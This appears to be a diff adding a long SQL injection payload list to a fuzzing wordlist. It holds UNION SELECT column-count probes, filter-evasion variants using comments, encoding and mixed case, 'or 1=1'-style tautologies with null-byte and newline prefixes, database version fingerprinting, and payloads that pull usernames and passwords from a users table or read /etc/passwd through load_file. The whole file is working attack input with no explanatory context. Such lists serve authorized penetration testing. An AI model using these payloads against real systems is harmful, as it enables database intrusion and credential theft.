+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
+ UNION ALL SELECT NULL 
+ UNION ALL SELECT NULL#
+ UNION ALL SELECT NULL-- 
+UNION ALL SELECT NULL 
+UNION ALL SELECT NULL#
+UNION ALL SELECT NULL-- 
+' UNION ALL SELECT system_user(),user();#
+ UNION ALL SELECT USER()-- 
+UNION ALL SELECT USER()-- 
+union all select @@version--
++union+distinctROW+select+
++union+distinct+select+
+union+sel%0bect
++un/**/ion+se/**/lect
++un/**/ion+sel/**/ect+
++uni on+sel ect+
++uni*on+sel*ect+
++uni>on+sel>ect+
+/*!union*/+/*!select*/
+/**//*!union*//**//*!select*//**/
+/**/union/**/select/**/
+/*--*/union/*--*/select/*--*/
+uni/**/on sel/**/ect
+union+/*!select*/
++ #?uNiOn + #?sEleCt
+/**/uNIon/**/sEleCt/**/
+/*!uNIOn*/ /*!SelECt*/
++(UnIoN)+(SelECT)+
+/*!UnIoN*/SeLecT+
+/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/
++/*!UnIoN*/+/*!SeLeCt*/+
+/*!UnIoN*/SeLeCT
++(UnI)(oN)+(SeL)(EcT)
++’UnI”On’+'SeL”ECT’
++un✓✓✓✓✓ion+select+1+--+
++union+select+1+--+
+UNION select 1;%00
+uNioN (/*!/**/ SeleCT */ 11)
+union (select 1111,2222,3333)
+’ +union+select+1,2 --+
++uNiOn+(/*!/**/SeleCT*/+1,22,333...)+--+
+' union select 1,2,3--
+union(select(1),2,3)
+union (/*!/**/ SeleCT */ 1,2,3)
+union(select (1),(2),(3),(4),(5))
+union se”,”lect 1,2,3,4,5,6,7,8,9,0,11#”] 
++union(select+1,2,3,4,concat(column_name),6,...+from+information_schema.columns+where+table_name=%22columna%22+limit+1,1)+--+
++union(select+1,2,3,database(),concat(hash,0x3a,hash),6..+from(columna))+--+
+' union select 1,2,3, load_file(‘/etc/passwd’) ,5,6,7,8 -- -
+' union select 1,2,3, load_file(‘/var/www/login.php’) ,5,6,7,8 -- -
+' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1-- 
+union select 1,column_name,3,4,5,6,7,8,9,10,11 from information_schema.columns where table_name='users' --
+ union select 1,load_file('/etc/passwd'),1,1,1;
+'''''''''''''UNION SELECT '2
+'+UNION+SELECT+'abc','def'+FROM+dual--
+' UNION SELECT 'a',NULL,NULL,NULL--
+UNION SELECT 'a' ,NULL,NULL,NULL--
+' union select banner,null from v$version--
+'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+UNION SELECT CASE WHEN (SELECT ASCII(SUBSTR((SELECT user FROM dual), 1, 1 )) FROM dual) >71 THEN (dbms_pipe.receive_message(('a'),10)) ELSE NULL END FROM dual --
+UNION(SELECT(column)FROM(table))
+) union select * from information_schema.tables;
+ union select * from users where login = char ...
+' union select null--
+' UNION SELECT NULL--
+'+UNION+SELECT+NULL,'abc'--
+' UNION SELECT NULL,'a',NULL,NULL--
+' union select null,null--
+' UNION SELECT NULL,NULL--
+'+UNION+SELECT+NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' union select null,null,null--
+' UNION SELECT NULL,NULL,NULL--
+'+UNION+SELECT+NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+UNION SELECT NULL,NULL,NULL,NULL--
+' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, (select @@version)) --
+' union (select NULL, (select @@version)) --
+' union select null,username||password from users--
+'+UNION+SELECT+NULL,username||"~"||password+FROM+users--
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+' union select password,null from users where username='administrator'--
+' UNION SELECT sum(columnname ) from tablename --
+' UNION select table_schema,table_name FROM information_Schema.tables;#
+' union select username||password from users--
+'UNION SELECT username, password FROM users--
+' union (select @@version) --
+' union select @@version,null#
+'+UNION+SELECT+@@version,+NULL#
+un?<ion sel="">+un/**/ion+se/**/lect+
+/union\sselect/g
+/union\s+select/i
+UNION/*&test=1*/SELECT/*&pwn=2*/
+/*union*/union/*select*/select+
+UNIunionON+SELselectECT
+/*uni X on*/union/*sel X ect*/
++UNunionION+SEselectLECT+
+update
+'||UTL_HTTP.REQUEST
+||UTL_HTTP.REQUEST
+,@variable
+@variable
+@@variable    global variable
+@variable    local variable
+@var select @var as var into temp end --
+ WHERE 1=1 AND 1=0
+ WHERE 1=1 AND 1=0#
+ WHERE 1=1 AND 1=0--
+WHERE 1=1 AND 1=0
+WHERE 1=1 AND 1=0#
+WHERE 1=1 AND 1=0--
+WHERE 1=1 AND 1=0# WHERE 1=1 AND 1=1-- WHERE 1=1 AND 1=0-- ORDER BY 1-- ORDER BY 2-- ORDER BY 3-- ORDER BY 4-- ORDER BY 5--
+WHERE 1=1 AND 1=0-- WHERE 1=1 AND 1=1 WHERE 1=1 AND 1=0 WHERE 1=1 AND 1=1# 
+ WHERE 1=1 AND 1=1
+ WHERE 1=1 AND 1=1#
+ WHERE 1=1 AND 1=1--
+WHERE 1=1 AND 1=1
+WHERE 1=1 AND 1=1#
+WHERE 1=1 AND 1=1--
+WHERE%201%3D1%20AND%201%3D0--
+WHERE%201%3D1%20AND%201%3D0--%20WHERE%201%3D1%20AND%201%3D1%20WHERE%201%3D1%20AND%201%3D0%20WHERE%201%3D1%20AND%201%3D1%23
+WHERE%201%3D1%20AND%201%3D0%23%20WHERE%201%3D1%20AND%201%3D1--%20WHERE%201%3D1%20AND%201%3D0--%20ORDER%20BY%201--%20ORDER%20BY%202--%20ORDER%20BY%203--%20ORDER%20BY%204--%20ORDER%20BY%205--
+WHERE%201%3D1%20AND%201%3D1
+WHERE%25201%253D1%2520AND%25201%253D0%2523%2520WHERE%25201%253D1%2520AND%25201%253D1--%2520WHERE%25201%253D1%2520AND%25201%253D0--%2520ORDER%2520BY%25201--%2520ORDER%2520BY%25202--%2520ORDER%2520BY%25203--%2520ORDER%2520BY%25204--%2520ORDER%2520BY%25205--
+WHERE%25201%253D1%2520AND%25201%253D1
+WHERE%2525201%25253D1%252520AND%2525201%25253D0%252523%252520WHERE%2525201%25253D1%252520AND%2525201%25253D1--%252520WHERE%2525201%25253D1%252520AND%2525201%25253D0--%252520ORDER%252520BY%2525201--%252520ORDER%252520BY%2525202--%252520ORDER%252520BY%2525203--%252520ORDER%252520BY%2525204--%252520ORDER%252520BY%2525205--
+WHERE%2525201%25253D1%252520AND%2525201%25253D1
+\x27UNION SELECT
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+x' AND email IS NULL; --
+x' AND members.email IS NULL; --
+x' AND userid IS NULL; --
+x' or 1=1 or 'x'='y
+x' OR full_name LIKE '%Bob%
+xyz''
+xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+%00';select @@version -- 
+%00';select banner from v$version -- 
+%00';select version from v$instance -- 
+%00';select version() -- 
+%00;select @@version
+%00;select @@version -- 
+%00;select banner from v$version
+%00;select banner from v$version -- 
+%00;select version from v$instance
+%00;select version from v$instance -- 
+%00;select version()
+%00;select version() -- 
+%00\';select @@version -- 
+%00\';select banner from v$version -- 
+%00\';select version from v$instance -- 
+%00\';select version() -- 
+%00\\';select @@version -- 
+%00\\';select banner from v$version -- 
+%00\\';select version from v$instance -- 
+%00\\';select version() -- 
+%0a';select @@version -- 
+%0a';select banner from v$version -- 
+%0a';select version from v$instance -- 
+%0a';select version() -- 
+%0a;select @@version
+%0a;select @@version -- 
+%0a;select banner from v$version
+%0a;select banner from v$version -- 
+%0a;select version from v$instance
+%0a;select version from v$instance -- 
+%0a;select version()
+%0a;select version() -- 
+%0a\';select @@version -- 
+%0a\';select banner from v$version -- 
+%0a\';select version from v$instance -- 
+%0a\';select version() -- 
+%0a\\';select @@version -- 
+%0a\\';select banner from v$version -- 
+%0a\\';select version from v$instance -- 
+%0a\\';select version() -- 
+%0d%0a';select @@version -- 
+%0d%0a';select banner from v$version -- 
+%0d%0a';select version from v$instance -- 
+%0d%0a';select version() -- 
+%0d%0a;select @@version
+%0d%0a;select @@version -- 
+%0d%0a;select banner from v$version
+%0d%0a;select banner from v$version -- 
+%0d%0a;select version from v$instance
+%0d%0a;select version from v$instance -- 
+%0d%0a;select version()
+%0d%0a;select version() -- 
+%0d%0a\';select @@version -- 
+%0d%0a\';select banner from v$version -- 
+%0d%0a\';select version from v$instance -- 
+%0d%0a\';select version() -- 
+%0d%0a\\';select @@version -- 
+%0d%0a\\';select banner from v$version -- 
+%0d%0a\\';select version from v$instance -- 
+%0d%0a\\';select version() -- 
+';select @@version -- 
+';select banner from v$version -- 
+';select version from v$instance -- 
+';select version() -- 
+0x00';select @@version -- 
+0x00';select banner from v$version -- 
+0x00';select version from v$instance -- 
+0x00';select version() -- 
+0x00;select @@version
+0x00;select @@version -- 
+0x00;select banner from v$version
+0x00;select banner from v$version -- 
+0x00;select version from v$instance
+0x00;select version from v$instance -- 
+0x00;select version()
+0x00;select version() -- 
+0x00\';select @@version -- 
+0x00\';select banner from v$version -- 
+0x00\';select version from v$instance -- 
+0x00\';select version() -- 
+0x00\\';select @@version -- 
+0x00\\';select banner from v$version -- 
+0x00\\';select version from v$instance -- 
+0x00\\';select version() -- 
+0x0a';select @@version -- 
+0x0a';select banner from v$version -- 
+0x0a';select version from v$instance -- 
+0x0a';select version() -- 
+0x0a;select @@version
+0x0a;select @@version -- 
+0x0a;select banner from v$version
+0x0a;select banner from v$version -- 
+0x0a;select version from v$instance
+0x0a;select version from v$instance -- 
+0x0a;select version()
+0x0a;select version() -- 
+0x0a\';select @@version -- 
+0x0a\';select banner from v$version -- 
+0x0a\';select version from v$instance -- 
+0x0a\';select version() -- 
+0x0a\\';select @@version -- 
+0x0a\\';select banner from v$version -- 
+0x0a\\';select version from v$instance -- 
+0x0a\\';select version() -- 
+0x0d0a';select @@version -- 
+0x0d0a';select banner from v$version -- 
+0x0d0a';select version from v$instance -- 
+0x0d0a';select version() -- 
+0x0d0a;select @@version
+0x0d0a;select @@version -- 
+0x0d0a;select banner from v$version
+0x0d0a;select banner from v$version -- 
+0x0d0a;select version from v$instance
+0x0d0a;select version from v$instance -- 
+0x0d0a;select version()
+0x0d0a;select version() -- 
+0x0d0a\';select @@version -- 
+0x0d0a\';select banner from v$version -- 
+0x0d0a\';select version from v$instance -- 
+0x0d0a\';select version() -- 
+0x0d0a\\';select @@version -- 
+0x0d0a\\';select banner from v$version -- 
+0x0d0a\\';select version from v$instance -- 
+0x0d0a\\';select version() -- 
+;select @@version
+;select @@version -- 
+;select banner from v$version
+;select banner from v$version -- 
+;select version from v$instance
+;select version from v$instance -- 
+;select version()
+;select version() -- 
+\';select @@version -- 
+\';select banner from v$version -- 
+\';select version from v$instance -- 
+\';select version() -- 
+\\';select @@version -- 
+\\';select banner from v$version -- 
+\\';select version from v$instance -- 
+\\';select version() -- 
+\\n';select @@version -- 
+\\n';select banner from v$version -- 
+\\n';select version from v$instance -- 
+\\n';select version() -- 
+\\n;select @@version
+\\n;select @@version -- 
+\\n;select banner from v$version
+\\n;select banner from v$version -- 
+\\n;select version from v$instance
+\\n;select version from v$instance -- 
+\\n;select version()
+\\n;select version() -- 
+\\n\\';select @@version -- 
+\\n\\';select banner from v$version -- 
+\\n\\';select version from v$instance -- 
+\\n\\';select version() -- 
+\\r\\n';select @@version -- 
+\\r\\n';select banner from v$version -- 
+\\r\\n';select version from v$instance -- 
+\\r\\n';select version() -- 
+\\r\\n;select @@version
+\\r\\n;select @@version -- 
+\\r\\n;select banner from v$version
+\\r\\n;select banner from v$version -- 
+\\r\\n;select version from v$instance
+\\r\\n;select version from v$instance -- 
+\\r\\n;select version()
+\\r\\n;select version() -- 
+\\r\\n\\';select @@version -- 
+\\r\\n\\';select banner from v$version -- 
+\\r\\n\\';select version from v$instance -- 
+\\r\\n\\';select version() -- 
+\n';select @@version -- 
+\n';select banner from v$version -- 
+\n';select version from v$instance -- 
+\n';select version() -- 
+\n;select @@version
+\n;select @@version -- 
+\n;select banner from v$version
+\n;select banner from v$version -- 
+\n;select version from v$instance
+\n;select version from v$instance -- 
+\n;select version()
+\n;select version() -- 
+\n\';select @@version -- 
+\n\';select banner from v$version -- 
+\n\';select version from v$instance -- 
+\n\';select version() -- 
+\r\n';select @@version -- 
+\r\n';select banner from v$version -- 
+\r\n';select version from v$instance -- 
+\r\n';select version() -- 
+\r\n;select @@version
+\r\n;select @@version -- 
+\r\n;select banner from v$version
+\r\n;select banner from v$version -- 
+\r\n;select version from v$instance
+\r\n;select version from v$instance -- 
+\r\n;select version()
+\r\n;select version() -- 
+\r\n\';select @@version -- 
+\r\n\';select banner from v$version -- 
+\r\n\';select version from v$instance -- 
+\r\n\';select version() -- 
+ or 'xyz'='xyz'
+ or 'xyz'='xyz' -- 
+ or 41<78
+ or 41<78 -- 
+ or 41=41
+ or 41=41 -- 
+ or \'xyz\'=\'xyz\'
+ or \'xyz\'=\'xyz\' -- 
+ or \\'xyz\\'=\\'xyz\\'
+ or \\'xyz\\'=\\'xyz\\' -- 
+%00 or 'xyz'='xyz'
+%00 or 'xyz'='xyz' -- 
+%00 or 41<78
+%00 or 41<78 -- 
+%00 or 41=41
+%00 or 41=41 -- 
+%00 or \'xyz\'=\'xyz\'
+%00 or \'xyz\'=\'xyz\' -- 
+%00 or \\'xyz\\'=\\'xyz\\'
+%00 or \\'xyz\\'=\\'xyz\\' -- 
+%00' or 'xyz'='xyz
+%00' or 'xyz'='xyz' -- 
+%00' or 41<78 -- 
+%00' or 41=41 -- 
+%00\' or 41<78 -- 
+%00\' or 41=41 -- 
+%00\' or \'xyz\'=\'xyz
+%00\' or \'xyz\'=\'xyz\' -- 
+%00\\' or 41<78 -- 
+%00\\' or 41=41 -- 
+%00\\' or \\'xyz\\'=\\'xyz
+%00\\' or \\'xyz\\'=\\'xyz\\' -- 
+%0a or 'xyz'='xyz'
+%0a or 'xyz'='xyz' -- 
+%0a or 41<78
+%0a or 41<78 -- 
+%0a or 41=41
+%0a or 41=41 -- 
+%0a or \'xyz\'=\'xyz\'
+%0a or \'xyz\'=\'xyz\' -- 
+%0a or \\'xyz\\'=\\'xyz\\'
+%0a or \\'xyz\\'=\\'xyz\\' -- 
+%0a' or 'xyz'='xyz
+%0a' or 'xyz'='xyz' -- 
+%0a' or 41<78 -- 
+%0a' or 41=41 -- 
+%0a\' or 41<78 -- 
+%0a\' or 41=41 -- 
+%0a\' or \'xyz\'=\'xyz
+%0a\' or \'xyz\'=\'xyz\' -- 
+%0a\\' or 41<78 -- 
+%0a\\' or 41=41 -- 
+%0a\\' or \\'xyz\\'=\\'xyz
+%0a\\' or \\'xyz\\'=\\'xyz\\' -- 
+%0d%0a or 'xyz'='xyz'
+%0d%0a or 'xyz'='xyz' -- 
+%0d%0a or 41<78
+%0d%0a or 41<78 -- 
+%0d%0a or 41=41
+%0d%0a or 41=41 -- 
+%0d%0a or \'xyz\'=\'xyz\'
+%0d%0a or \'xyz\'=\'xyz\' -- 
+%0d%0a or \\'xyz\\'=\\'xyz\\'
+%0d%0a or \\'xyz\\'=\\'xyz\\' -- 
+%0d%0a' or 'xyz'='xyz
+%0d%0a' or 'xyz'='xyz' -- 
+%0d%0a' or 41<78 -- 
+%0d%0a' or 41=41 -- 
+%0d%0a\' or 41<78 -- 
+%0d%0a\' or 41=41 -- 
+%0d%0a\' or \'xyz\'=\'xyz
+%0d%0a\' or \'xyz\'=\'xyz\' -- 
+%0d%0a\\' or 41<78 -- 
+%0d%0a\\' or 41=41 -- 
+%0d%0a\\' or \\'xyz\\'=\\'xyz
+%0d%0a\\' or \\'xyz\\'=\\'xyz\\' -- 
+' or 'xyz'='xyz
+' or 'xyz'='xyz' -- 
+' or 41<78 -- 
+' or 41=41 -- 
+0x00 or 'xyz'='xyz'
+0x00 or 'xyz'='xyz' -- 
+0x00 or 41<78
+0x00 or 41<78 -- 
+0x00 or 41=41
+0x00 or 41=41 -- 
+0x00 or \'xyz\'=\'xyz\'
+0x00 or \'xyz\'=\'xyz\' -- 
+0x00 or \\'xyz\\'=\\'xyz\\'
+0x00 or \\'xyz\\'=\\'xyz\\' -- 
+0x00' or 'xyz'='xyz
+0x00' or 'xyz'='xyz' -- 
+0x00' or 41<78 -- 
+0x00' or 41=41 -- 
+0x00\' or 41<78 -- 
+0x00\' or 41=41 -- 
+0x00\' or \'xyz\'=\'xyz
+0x00\' or \'xyz\'=\'xyz\' -- 
+0x00\\' or 41<78 -- 
+0x00\\' or 41=41 -- 
+0x00\\' or \\'xyz\\'=\\'xyz
+0x00\\' or \\'xyz\\'=\\'xyz\\' -- 
+0x0a or 'xyz'='xyz'
+0x0a or 'xyz'='xyz' -- 
+0x0a or 41<78
+0x0a or 41<78 -- 
+0x0a or 41=41
+0x0a or 41=41 -- 
+0x0a or \'xyz\'=\'xyz\'
+0x0a or \'xyz\'=\'xyz\' -- 
+0x0a or \\'xyz\\'=\\'xyz\\'
+0x0a or \\'xyz\\'=\\'xyz\\' -- 
+0x0a' or 'xyz'='xyz
+0x0a' or 'xyz'='xyz' -- 
+0x0a' or 41<78 -- 
+0x0a' or 41=41 -- 
+0x0a\' or 41<78 -- 
+0x0a\' or 41=41 -- 
+0x0a\' or \'xyz\'=\'xyz
+0x0a\' or \'xyz\'=\'xyz\' -- 
+0x0a\\' or 41<78 -- 
+0x0a\\' or 41=41 -- 
+0x0a\\' or \\'xyz\\'=\\'xyz
+0x0a\\' or \\'xyz\\'=\\'xyz\\' -- 
+0x0d0a or 'xyz'='xyz'
+0x0d0a or 'xyz'='xyz' -- 
+0x0d0a or 41<78
+0x0d0a or 41<78 -- 
+0x0d0a or 41=41
+0x0d0a or 41=41 -- 
+0x0d0a or \'xyz\'=\'xyz\'
+0x0d0a or \'xyz\'=\'xyz\' -- 
+0x0d0a or \\'xyz\\'=\\'xyz\\'
+0x0d0a or \\'xyz\\'=\\'xyz\\' -- 
+0x0d0a' or 'xyz'='xyz
+0x0d0a' or 'xyz'='xyz' -- 
+0x0d0a' or 41<78 -- 
+0x0d0a' or 41=41 -- 
+0x0d0a\' or 41<78 -- 
+0x0d0a\' or 41=41 -- 
+0x0d0a\' or \'xyz\'=\'xyz
+0x0d0a\' or \'xyz\'=\'xyz\' -- 
+0x0d0a\\' or 41<78 -- 
+0x0d0a\\' or 41=41 -- 
+0x0d0a\\' or \\'xyz\\'=\\'xyz
+0x0d0a\\' or \\'xyz\\'=\\'xyz\\' -- 
+\' or 41<78 -- 
+\' or 41=41 -- 
+\' or \'xyz\'=\'xyz
+\' or \'xyz\'=\'xyz\' -- 
+\\' or 41<78 -- 
+\\' or 41=41 -- 
+\\' or \\'xyz\\'=\\'xyz
+\\' or \\'xyz\\'=\\'xyz\\' -- 
+\\n or 'xyz'='xyz'
+\\n or 'xyz'='xyz' -- 
+\\n or 41<78
+\\n or 41<78 -- 
+\\n or 41=41
+\\n or 41=41 -- 
+\\n or \\'xyz\\'=\\'xyz\\'
+\\n or \\'xyz\\'=\\'xyz\\' -- 
+\\n' or 'xyz'='xyz
+\\n' or 'xyz'='xyz' -- 
+\\n' or 41<78 -- 
+\\n' or 41=41 -- 
+\\n\\' or 41<78 -- 
+\\n\\' or 41=41 -- 
+\\n\\' or \\'xyz\\'=\\'xyz
+\\n\\' or \\'xyz\\'=\\'xyz\\' -- 
+\\r\\n or 'xyz'='xyz'
+\\r\\n or 'xyz'='xyz' -- 
+\\r\\n or 41<78
+\\r\\n or 41<78 -- 
+\\r\\n or 41=41
+\\r\\n or 41=41 -- 
+\\r\\n or \\'xyz\\'=\\'xyz\\'
+\\r\\n or \\'xyz\\'=\\'xyz\\' -- 
+\\r\\n' or 'xyz'='xyz
+\\r\\n' or 'xyz'='xyz' -- 
+\\r\\n' or 41<78 -- 
+\\r\\n' or 41=41 -- 
+\\r\\n\\' or 41<78 -- 
+\\r\\n\\' or 41=41 -- 
+\\r\\n\\' or \\'xyz\\'=\\'xyz
+\\r\\n\\' or \\'xyz\\'=\\'xyz\\' -- 
+\n or 'xyz'='xyz'
+\n or 'xyz'='xyz' -- 
+\n or 41<78
+\n or 41<78 -- 
+\n or 41=41
+\n or 41=41 -- 
+\n or \'xyz\'=\'xyz\'
+\n or \'xyz\'=\'xyz\' -- 
+\n' or 'xyz'='xyz
+\n' or 'xyz'='xyz' -- 
+\n' or 41<78 -- 
+\n' or 41=41 -- 
+\n\' or 41<78 -- 
+\n\' or 41=41 -- 
+\n\' or \'xyz\'=\'xyz
+\n\' or \'xyz\'=\'xyz\' -- 
+\r\n or 'xyz'='xyz'
+\r\n or 'xyz'='xyz' -- 
+\r\n or 41<78
+\r\n or 41<78 -- 
+\r\n or 41=41
+\r\n or 41=41 -- 
+\r\n or \'xyz\'=\'xyz\'
+\r\n or \'xyz\'=\'xyz\' -- 
+\r\n' or 'xyz'='xyz
+\r\n' or 'xyz'='xyz' -- 
+\r\n' or 41<78 -- 
+\r\n' or 41=41 -- 
+\r\n\' or 41<78 -- 
+\r\n\' or 41=41 -- 
+\r\n\' or \'xyz\'=\'xyz
+\r\n\' or \'xyz\'=\'xyz\' -- 
+ union all select '1337'
+ union all select '1337' -- 
+ union all select '1337' from dual
+ union all select '1337' from dual -- 
+ union all select '1337','1337'
+ union all select '1337','1337' -- 
+ union all select '1337','1337' from dual
+ union all select '1337','1337' from dual -- 
+ union all select '1337','1337','1337'
+ union all select '1337','1337','1337' -- 
+ union all select '1337','1337','1337' from dual
+ union all select '1337','1337','1337' from dual -- 
+ union all select '1337','1337','1337','1337'
+ union all select '1337','1337','1337','1337' -- 
+ union all select '1337','1337','1337','1337' from dual
+ union all select '1337','1337','1337','1337' from dual -- 
+ union all select '1337','1337','1337','1337','1337'
+ union all select '1337','1337','1337','1337','1337' -- 
+ union all select '1337','1337','1337','1337','1337' from dual
+ union all select '1337','1337','1337','1337','1337' from dual -- 
+ union all select 1337
+ union all select 1337 -- 
+ union all select 1337 from dual
+ union all select 1337 from dual -- 
+ union all select 1337,1337
+ union all select 1337,1337 -- 
+ union all select 1337,1337 from dual
+ union all select 1337,1337 from dual -- 
+ union all select 1337,1337,1337
+ union all select 1337,1337,1337 -- 
+ union all select 1337,1337,1337 from dual
+ union all select 1337,1337,1337 from dual -- 
+ union all select 1337,1337,1337,1337
+ union all select 1337,1337,1337,1337 -- 
+ union all select 1337,1337,1337,1337 from dual
+ union all select 1337,1337,1337,1337 from dual -- 
+ union all select 1337,1337,1337,1337,1337
+ union all select 1337,1337,1337,1337,1337 -- 
+ union all select 1337,1337,1337,1337,1337 from dual
+ union all select 1337,1337,1337,1337,1337 from dual -- 
+ union all select null
+ union all select null -- 
+ union all select null from dual
+ union all select null from dual -- 
+ union all select null,null
+ union all select null,null -- 
+ union all select null,null from dual
+ union all select null,null from dual -- 
+ union all select null,null,null
+ union all select null,null,null -- 
+ union all select null,null,null from dual
+ union all select null,null,null from dual -- 
+ union all select null,null,null,null
+ union all select null,null,null,null -- 
+ union all select null,null,null,null from dual
+ union all select null,null,null,null from dual -- 
+ union all select null,null,null,null,null
+ union all select null,null,null,null,null -- 
+ union all select null,null,null,null,null from dual
+ union all select null,null,null,null,null from dual -- 
+%00 union all select '1337'
+%00 union all select '1337' -- 
+%00 union all select '1337' from dual
+%00 union all select '1337' from dual -- 
+%00 union all select '1337','1337'
+%00 union all select '1337','1337' -- 
+%00 union all select '1337','1337' from dual
+%00 union all select '1337','1337' from dual -- 
+%00 union all select '1337','1337','1337'
+%00 union all select '1337','1337','1337' -- 
+%00 union all select '1337','1337','1337' from dual
+%00 union all select '1337','1337','1337' from dual -- 
+%00 union all select '1337','1337','1337','1337'
+%00 union all select '1337','1337','1337','1337' -- 
+%00 union all select '1337','1337','1337','1337' from dual
+%00 union all select '1337','1337','1337','1337' from dual -- 
+%00 union all select '1337','1337','1337','1337','1337'
+%00 union all select '1337','1337','1337','1337','1337' -- 
+%00 union all select '1337','1337','1337','1337','1337' from dual
+%00 union all select '1337','1337','1337','1337','1337' from dual -- 
+%00 union all select 1337
+%00 union all select 1337 -- 
+%00 union all select 1337 from dual
+%00 union all select 1337 from dual -- 
+%00 union all select 1337,1337
+%00 union all select 1337,1337 -- 
+%00 union all select 1337,1337 from dual
+%00 union all select 1337,1337 from dual -- 
+%00 union all select 1337,1337,1337
+%00 union all select 1337,1337,1337 -- 
+%00 union all select 1337,1337,1337 from dual
+%00 union all select 1337,1337,1337 from dual -- 
+%00 union all select 1337,1337,1337,1337
+%00 union all select 1337,1337,1337,1337 -- 
+%00 union all select 1337,1337,1337,1337 from dual
+%00 union all select 1337,1337,1337,1337 from dual -- 
+%00 union all select 1337,1337,1337,1337,1337
+%00 union all select 1337,1337,1337,1337,1337 -- 
+%00 union all select 1337,1337,1337,1337,1337 from dual
+%00 union all select 1337,1337,1337,1337,1337 from dual -- 
+%00 union all select null
+%00 union all select null -- 
+%00 union all select null from dual
+%00 union all select null from dual -- 
+%00 union all select null,null
+%00 union all select null,null -- 
+%00 union all select null,null from dual
+%00 union all select null,null from dual -- 
+%00 union all select null,null,null
+%00 union all select null,null,null -- 
+%00 union all select null,null,null from dual
+%00 union all select null,null,null from dual -- 
+%00 union all select null,null,null,null
+%00 union all select null,null,null,null -- 
+%00 union all select null,null,null,null from dual
+%00 union all select null,null,null,null from dual -- 
+%00 union all select null,null,null,null,null
+%00 union all select null,null,null,null,null -- 
+%00 union all select null,null,null,null,null from dual
+%00 union all select null,null,null,null,null from dual -- 
+%00' union all select '1337' -- 
+%00' union all select '1337' from dual -- 
+%00' union all select '1337','1337' -- 
+%00' union all select '1337','1337' from dual -- 
+%00' union all select '1337','1337','1337' -- 
+%00' union all select '1337','1337','1337' from dual -- 
+%00' union all select '1337','1337','1337','1337' -- 
+%00' union all select '1337','1337','1337','1337' from dual -- 
+%00' union all select '1337','1337','1337','1337','1337' -- 
+%00' union all select '1337','1337','1337','1337','1337' from dual -- 
+%00' union all select 1337 -- 
+%00' union all select 1337 from dual -- 
+%00' union all select 1337,1337 -- 
+%00' union all select 1337,1337 from dual -- 
+%00' union all select 1337,1337,1337 -- 
+%00' union all select 1337,1337,1337 from dual -- 
+%00' union all select 1337,1337,1337,1337 -- 
+%00' union all select 1337,1337,1337,1337 from dual -- 
+%00' union all select 1337,1337,1337,1337,1337 -- 
+%00' union all select 1337,1337,1337,1337,1337 from dual -- 
+%00' union all select null -- 
+%00' union all select null from dual -- 
+%00' union all select null,null -- 
+%00' union all select null,null from dual -- 
+%00' union all select null,null,null -- 
+%00' union all select null,null,null from dual -- 
+%00' union all select null,null,null,null -- 
+%00' union all select null,null,null,null from dual -- 
+%00' union all select null,null,null,null,null -- 
+%00' union all select null,null,null,null,null from dual -- 
+%00\' union all select '1337' -- 
+%00\' union all select '1337' from dual -- 
+%00\' union all select '1337','1337' -- 
+%00\' union all select '1337','1337' from dual -- 
+%00\' union all select '1337','1337','1337' -- 
+%00\' union all select '1337','1337','1337' from dual -- 
+%00\' union all select '1337','1337','1337','1337' -- 
+%00\' union all select '1337','1337','1337','1337' from dual -- 
+%00\' union all select '1337','1337','1337','1337','1337' -- 
+%00\' union all select '1337','1337','1337','1337','1337' from dual -- 
+%00\' union all select 1337 -- 
+%00\' union all select 1337 from dual -- 
+%00\' union all select 1337,1337 -- 
+%00\' union all select 1337,1337 from dual -- 
+%00\' union all select 1337,1337,1337 -- 
+%00\' union all select 1337,1337,1337 from dual -- 
+%00\' union all select 1337,1337,1337,1337 -- 
+%00\' union all select 1337,1337,1337,1337 from dual -- 
+%00\' union all select 1337,1337,1337,1337,1337 -- 
+%00\' union all select 1337,1337,1337,1337,1337 from dual -- 
+%00\' union all select null -- 
+%00\' union all select null from dual -- 
+%00\' union all select null,null -- 
+%00\' union all select null,null from dual -- 
+%00\' union all select null,null,null -- 
+%00\' union all select null,null,null from dual -- 
+%00\' union all select null,null,null,null -- 
+%00\' union all select null,null,null,null from dual -- 
+%00\' union all select null,null,null,null,null -- 
+%00\' union all select null,null,null,null,null from dual -- 
+%00\\' union all select '1337' -- 
+%00\\' union all select '1337' from dual -- 
+%00\\' union all select '1337','1337' -- 
+%00\\' union all select '1337','1337' from dual -- 
+%00\\' union all select '1337','1337','1337' -- 
+%00\\' union all select '1337','1337','1337' from dual -- 
+%00\\' union all select '1337','1337','1337','1337' -- 
+%00\\' union all select '1337','1337','1337','1337' from dual -- 
+%00\\' union all select '1337','1337','1337','1337','1337' -- 
+%00\\' union all select '1337','1337','1337','1337','1337' from dual -- 
